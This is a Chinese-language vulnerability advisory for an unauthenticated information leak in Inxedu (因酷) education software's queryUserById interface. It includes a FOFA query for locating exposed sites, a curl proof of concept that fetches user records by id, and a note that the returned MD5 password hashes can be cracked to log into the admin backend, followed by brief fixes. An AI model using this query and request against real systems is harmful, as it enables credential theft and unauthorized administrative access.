# 因酷教育软件 queryUserById 信息泄露漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | 因酷教育软件 queryUserById 信息泄露漏洞 |
| 漏洞类型 | 未授权访问 / 信息泄露 |
| 组件 | 因酷教育软件 |
| 严重程度 | 高危 |

## 漏洞概述

因酷教育软件 queryUserById 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，从而登录后台，使系统处于极不安全的状态。

## fofa查询语句

```
body="/image/keupload?" && body="uploadSimpleUrl"
```

## 漏洞复现

### POC

```bash
curl -v "http://目标IP/webapp/queryUserById?id=7"
```

返回数据包含用户密码MD5哈希，可解密后登录后台。

### nuclei模板

（待补充）

## 修复建议

1. 关闭互联网暴露面或接口设置访问权限
2. 升级至安全版本